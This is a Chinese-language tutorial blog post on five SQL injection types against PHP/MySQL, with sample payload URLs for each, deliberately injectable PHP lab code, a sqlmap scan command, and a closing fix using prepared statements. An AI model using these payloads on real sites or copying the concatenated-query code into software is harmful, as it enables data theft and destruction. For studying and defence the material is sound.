---
layout: post
title: "认识SQL注入的类型"
description: ""
category: WEB安全
tags: []
---
{% include JB/setup %}

SQL的注入类型有以下5种：

1. Boolean-based blind SQL injection（布尔型注入）
1. Error-based SQL injection（报错型注入）
1. UNION query SQL injection（可联合查询注入）
1. Stacked queries SQL injection（可多语句查询注入）
1. Time-based blind SQL injection（基于时间延迟注入）

<!--more-->

> 下文都是基于PHP、MySQL测试得到的结果。

#### Boolean-based blind SQL injection（布尔型注入）
- - -
通过判断页面返回情况获得想要的信息。

如下SQL注入：

{% highlight sql linenos %}
http://hello.com/view?id=1 and substring(version(),1,1)=5
{% endhighlight %}

如果服务端MySQL版本是5.X的话，那么页面返回的内容就会跟正常请求一样。攻击者就可以通过这种方式获取到MySQL的各类信息。

#### Error-based SQL injection（报错型注入）
- - -
如果页面能够输出SQL报错信息，则可以从报错信息中获得想要的信息。

典型的就是利用group by的duplicate entry错误。关于这个错误，貌似是MySQL存在的 bug：[duplicate key for entry on select?](http://www.codingforums.com/mysql/262063-duplicate-key-entry-select.html)、[SQL Injection attack - What does this do?](http://stackoverflow.com/questions/11787558/sql-injection-attack-what-does-this-do)

如下SQL注入：

{% highlight sql linenos %}
http://hello.com/view?id=1%20AND%20(SELECT%207506%20FROM(SELECT%20COUNT(*),CONCAT(0x717a707a71,(SELECT%20MID((IFNULL(CAST(schema_name%20
AS%20CHAR),0x20)),1,54)%20FROM%20INFORMATION_SCHEMA.SCHEMATA%20
LIMIT%202,1),0x7178786271,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_
SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)
{% endhighlight %}

在抛出的SQL错误中会包含这样的信息：`Duplicate entry 'qzpzqttqxxbq1' for key 'group_key'`，其中qzpzq和qxxbq分别是0x717a707a71和0x7178786271，用这两个字符串包住了tt（即数据库名），是为了方便sql注入程序从返回的错误内容中提取出信息。

#### UNION query SQL injection（可联合查询注入）
- - -
最快捷的方法，通过UNION查询获取到所有想要的数据，前提是请求返回后能输出SQL执行后查询到的所有内容。

如下SQL注入：

{% highlight sql linenos %}
http://hello.com/view?id=1 UNION ALL SELECT SCHEMA_NAME, DEFAULT_CHARACTER_SET_NAME FROM INFORMATION_SCHEMA.SCHEMATA
{% endhighlight %}

#### Stacked queries SQL injection（可多语句查询注入）
- - -
即能够执行多条查询语句，非常危险，因为这意味着能够对数据库直接做更新操作。

如下SQL注入：

{% highlight sql linenos %}
 http://hello.com/view?id=1;update t1 set content = 'aaaaaaaaa'
{% endhighlight %}

在第二次请求`http://hello.com/view?id=1`时，会发现所有的content都被设置为aaaaaaaaa了。

#### Time-based blind SQL injection（基于时间延迟注入）
- - -
页面不会返回错误信息，不会输出UNION注入所查出来的泄露的信息。类似搜索这类请求，boolean注入也无能为力，因为搜索返回空也属于正常的，这时就得采用time-based的注入了，即判断请求响应的时间，但该类型注入获取信息的速度非常慢。

如下SQL注入：

{% highlight sql linenos %}
 http://hello.com/view?q=abc' AND (SELECT * FROM (SELECT(SLEEP(5)))VCVe) OR 1 = '
{% endhighlight %}

该请求会使MySQL的查询睡眠5S，攻击者可以通过添加条件判断到SQL中，比如IF(substring(version(),1,1)=5, sleep(5), 't') AS value就能做到类似boolean注入的效果，如果睡眠了5s，那么说明MySQL版本为5，否则不是，但这种方式获取信息的速度就会很慢了，因为要做非常多的判断，并且需要花时间等待，不断地去测试出相应的值出来。

#### 来做个实验
- - -
使用SQL注入工具：sqlmap

服务端代码（输出SQL报错信息、输出SQL查出来的所有内容）：

{% highlight php linenos %}
<?php
$pdo = new PDO("mysql:host=$host;dbname=tt", $db_user, $password);
$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);                                                                                                                       
$res = $pdo->query('select * from t1 where id = ' . $_GET['id']);
var_dump($res->fetchAll());
?>
{% endhighlight %}
执行sqlmap获取所有数据库名：
{% highlight sql linenos %}
sqlmap -u http://host/id\=1\* --dbms=mysql --dbs -v 3 --level=5 --risk=3
{% endhighlight %}

查看执行结果：

![mysql](/assets/img/201511210201.png)
从输出结果可以看出支持所有类型的SQL注入。

获取到的数据库名：

![mysql](/assets/img/201511210202.png)

服务端代码去掉SQL报错信息：

{% highlight php linenos %}
<?php
$pdo = new PDO("mysql:host=$host;dbname=tt", $db_user, $password);
$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_SILENT);                                                                                                                       
$res = $pdo->query('select * from t1 where id = ' . $_GET['id']);
var_dump($res->fetchAll());
?>
{% endhighlight %}

重新执行sqlmap，查看执行结果：

![mysql](/assets/img/201511210203.png)

从输出结果可以看出无法使用error-based注入了。

服务端代码改为去掉任何的输出信息：

{% highlight php linenos %}
<?php
$pdo = new PDO("mysql:host=$host;dbname=tt", $db_user, $password);
$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_SILENT);                                                                                                          
$res = $pdo->query('select * from t1 where id = ' . $_GET['id']);
?>                         
{% endhighlight %}

![mysql](/assets/img/201511210204.png)

从输出结果可以看出只支持stacked注入和time-based注入，但要获得数据库信息只能使用time-based注入获得，且会做非常多次的注入尝试，如下图：

![mysql](/assets/img/201511210205.png)

#### 如何防止SQL注入？
- - -
使用MySQL提供的[SQL Syntax for Prepared Statements](http://dev.mysql.com/doc/refman/5.5/en/sql-syntax-prepared-statements.html)，即语句预处理，从web开发的角度来讲是参数绑定查询，能够抵挡住上述所说的所有SQL注入= =

{% highlight php linenos %}
<?php
$pdo = new PDO('mysql:host=192.168.103.111;dbname=tt', 'test', '19921212');
$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);                                                                                                                       
$res = $pdo->prepare('select * from t1 where id = ?');
$res->execute([$_GET['id']]);
var_dump($res->fetchAll());
?>                      
{% endhighlight %}

sqlmap执行结果：

![mysql](/assets/img/201511210206.png)
